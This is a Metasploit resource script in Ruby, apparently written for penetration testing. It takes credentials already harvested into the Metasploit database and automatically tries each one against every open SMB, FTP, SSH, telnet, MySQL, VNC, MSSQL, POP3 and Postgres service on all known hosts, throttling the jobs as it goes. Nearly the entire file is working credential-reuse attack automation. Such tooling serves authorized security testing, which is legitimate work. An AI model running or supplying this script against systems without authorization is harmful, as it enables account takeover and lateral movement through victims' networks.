# auto-cred-checker.rb
# Author: m-1-k-3 (Web: http://www.s3cur1ty.de / Twitter: @s3cur1ty_de)

# This Metasploit RC-File could be used to automatically check already discovered
# credentials against some other login services.
# It uses allready discovered credential from the database and tries to use them against some
# other services

<ruby>
#we look in the global datastore for a global VERBOSE option and use it
if (framework.datastore['VERBOSE'] == "true")
	verbose = 1 #true
else
	verbose = 0
end

# Test and see if we have a database connected
begin
	framework.db.hosts
rescue ::ActiveRecord::ConnectionNotEstablished
	print_error("Database connection isn't established")
	return
end

def jobwaiting(verbose)
		maxjobs=15  #throtteling if we get too much jobs
		while(framework.jobs.keys.length >= maxjobs)
			::IO.select(nil, nil, nil, 2.5)
			if (verbose == 1)
				print_error("waiting for finishing some modules... active jobs: #{framework.jobs.keys.length} / threads: #{framework.threads.length}")
			end
		end
end

def infos(serv,creds,host)
	print_line("")
	print_line("====================================")
	print_line("IP: #{host.address}")
	print_line("OS: #{host.os_name}")
	print_line("Servicename: #{serv.name}")
	print_line("Service Port: #{serv.port.to_i}")
	print_line("Service Protocol: #{serv.proto}")
	print_line("User: #{creds.user}")
	print_line("Pass: #{creds.pass}")
	print_line("====================================")
	print_line("")
end

framework.db.creds.each do |creds|
	# ... we do not check windows hashes ... have a look at auto_pass_the_hash.rb
	next if ( creds.ptype == "smb_hash" )

	password = creds.pass
	username = creds.user

	framework.db.hosts.each do |host|
		host.services.each do |serv|
			next if not serv.host
			next if (serv.state != ServiceState::Open)
			# for now we only check these services, you can add some more ...
			next if not (serv.name =~ /smb/ or 
			             serv.name =~ /microsoft-ds/ or 
			             serv.name =~ /netbios-ssn/ or 
			             serv.name =~ /ftp/ or 
			             serv.name =~ /ssh/ or 
			             serv.name =~ /telnet/ or 
			             serv.name =~ /mysql/ or 
			             serv.name =~ /vnc/ or 
			             serv.name =~ /mssql/ or 
			             serv.name =~ /pop3/ or 
			             serv.name =~ /postgres/)

			xport = serv.port.to_i
			xprot = serv.proto
			xname = serv.name
			xhost = host.address 

			if(xname =~ /smb/ or xname =~ /microsoft-ds/ or xname =~ /netbios-ssn/) 
				print_line("smb_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end

				run_single("use auxiliary/scanner/smb/smb_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")            # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")            # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false")  # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")     # to check just the credentials of the db we have to disable this
				run_single("set SMBUser #{username}")
				run_single("set SMBPass #{password}")

				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end

				jobwaiting(verbose)
				run_single("back")

			elsif (xname =~ /ftp/)
				print_line("ftp_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end
				run_single("use auxiliary/scanner/ftp/ftp_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")           # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false") # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")    # to check just the credentials of the db we have to disable this
				run_single("set USERNAME #{username}")
				run_single("set PASSWORD #{password}")
				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end
				jobwaiting(verbose)
				run_single("back")

			elsif(xname =~ /ssh/)
				print_line("ssh_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end

				run_single("use auxiliary/scanner/ssh/ssh_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")           # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false") # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")    # to check just the credentials of the db we have to disable this
				run_single("set USERNAME #{username}")
				run_single("set PASSWORD #{password}")

				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end

				jobwaiting(verbose)
				run_single("back")

			elsif(xname =~ /telnet/)
				print_line("telnet_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end

				run_single("use auxiliary/scanner/telnet/telnet_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")           # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false") # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")    # to check just the credentials of the db we have to disable this
				run_single("set USERNAME #{username}")
				run_single("set PASSWORD #{password}")

				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end

				jobwaiting(verbose)
				run_single("back")

			elsif(xname =~ /mysql/)
				print_line("mysql_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end
				run_single("use auxiliary/scanner/mysql/mysql_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")           # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false") # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")    # to check just the credentials of the db we have to disable this
				run_single("set USERNAME #{username}")
				run_single("set PASSWORD #{password}")

				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end

				jobwaiting(verbose)
				run_single("back")

			elsif(xname =~ /vnc/)
				print_line("vnc_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end

				run_single("use auxiliary/scanner/vnc/vnc_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")           # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false") # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")    # to check just the credentials of the db we have to disable this
				run_single("set USERNAME #{username}")
				run_single("set PASSWORD #{password}")

				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end

				jobwaiting(verbose)
				run_single("back")

			elsif(xname =~ /mssql/)
				print_line("mssql_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end

				run_single("use auxiliary/scanner/mssql/mssql_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")           # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false") # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")    # to check just the credentials of the db we have to disable this
				run_single("set USERNAME #{username}")
				run_single("set PASSWORD #{password}")
				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end
				jobwaiting(verbose)
				run_single("back")

			elsif(xname =~ /pop3/)
				print_line("pop3_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end

				run_single("use auxiliary/scanner/pop3/pop3_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")           # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false") # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")    # to check just the credentials of the db we have to disable this
				run_single("set USERNAME #{username}")
				run_single("set PASSWORD #{password}")
				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end

				jobwaiting(verbose)
				run_single("back")

			elsif (xname =~ /postgres/)
				print_line("postgres_login")
				if(verbose == 1)
					infos(serv,creds,host)
				end

				run_single("use auxiliary/scanner/postgres/postgres_login")
				run_single("set RHOSTS #{xhost}")
				run_single("set RPORT #{xport}")
				run_single("unset USER_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset PASS_FILE")           # to check just the credentials of the db we have to disable this
				run_single("unset USERPASS_FILE")       # to check just the credentials of the db we have to disable this
				run_single("set BLANK_PASSWORDS false") # to check just the credentials of the db we have to disable this
				run_single("set USER_AS_PASS false")    # to check just the credentials of the db we have to disable this
				run_single("set USERNAME #{username}")
				run_single("set PASSWORD #{password}")

				if(verbose == 1)
					run_single("set VERBOSE true")
					run_single("run -j")
				else
					run_single("run -j -q")
				end
				jobwaiting(verbose)
				run_single("back")

			end
		end # host.services.each loop
	end # framework.db.hosts.each loop
end
</ruby>
